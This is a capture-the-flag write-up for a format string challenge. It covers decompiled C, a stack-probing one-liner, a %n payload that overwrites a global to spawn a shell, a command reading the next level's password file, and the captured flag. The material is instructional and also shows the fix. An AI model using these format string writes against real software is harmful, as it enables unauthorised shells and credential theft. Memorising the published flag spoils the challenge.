# 🎯 Level3 - Format String Vulnerability

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Welcome to format string exploitation! 🎨

## 📋 Binary Analysis

### 🎯 V Function (Decompiled)
```c
void v(void)
{
  char local_20c [520];
  
  fgets(local_20c, 0x200, stdin);
  printf(local_20c);              // ⚠️ FORMAT STRING VULNERABILITY!
  if (m == 0x40) {                // If m equals 64
    fwrite("Wait what?!\n", 1, 0xc, stdout);
    system("/bin/sh");            // Spawn shell!
  }
  return;
}
```

### 🔑 Global Variable
```asm
m                                    XREF[2]: Entry Point(*), v:080484da(R)  
0804988c    00 00 00 00    undefined4    00000000h
```

**Address of `m`**: `0x0804988c`

## 🚨 Vulnerability

### The Problem
```c
printf(local_20c);  // ❌ WRONG! No format specifier
```

**Should be**:
```c
printf("%s", local_20c);  // ✅ CORRECT
```

### What This Allows
- 🔍 **Memory disclosure**: Read values from the stack using `%x`, `%p`, `%s`
- ✍️ **Memory write**: Modify arbitrary memory using `%n`
- 🎯 **Goal**: Modify global variable `m` to equal `0x40` (64)

## 💣 Exploit Strategy

### Step 1: Find Stack Position 🔎
```bash
python -c 'print "AAAA" + "%x."*10' | ./level3
```

**Output**:
```
AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78...
                            ^^^^^^^^
                         Position 4!
```

### Step 2: Understand Format String Primitives

| Specifier | Description |
|-----------|-------------|
| `%x` | Print hexadecimal from stack |
| `%p` | Print pointer from stack |
| `%s` | Print string from pointer on stack |
| `%n` | **Write** number of bytes printed to address on stack |
| `%4$n` | Write to 4th argument (direct parameter access) |

### Step 3: Calculate Payload 🧮

```
[Address: 4 bytes] + [Padding: 60 bytes] = 64 bytes total (0x40)
      ↓                    ↓                      ↓
 0x0804988c           %60x                    %4$n
```

**Breakdown**:
- `\x8c\x98\x04\x08` → Address of `m` (little-endian)
- `%60x` → Print 60 hex characters (padding)
- `%4$n` → Write byte count (64) to 4th stack position

### Step 4: Execute Exploit 💥
```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60x%4$n"'; cat) | ./level3
```

**What Happens**:
1. Address of `m` is placed at stack position 4
2. `%60x` prints 60 characters → total bytes = 4 + 60 = 64
3. `%4$n` writes 64 to the address at position 4 (which is `m`)
4. `m == 0x40` condition is true → shell spawns! 🎉

### Step 5: Get the Flag 🚩
```bash
cat /home/user/level4/.pass
```

---

> 💡 **Pro Tip**: Always use `printf("%s", buffer)` instead of `printf(buffer)`!

> ⚠️ **Security Note**: Format string bugs were extremely common in the 90s/2000s and led to many exploits!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
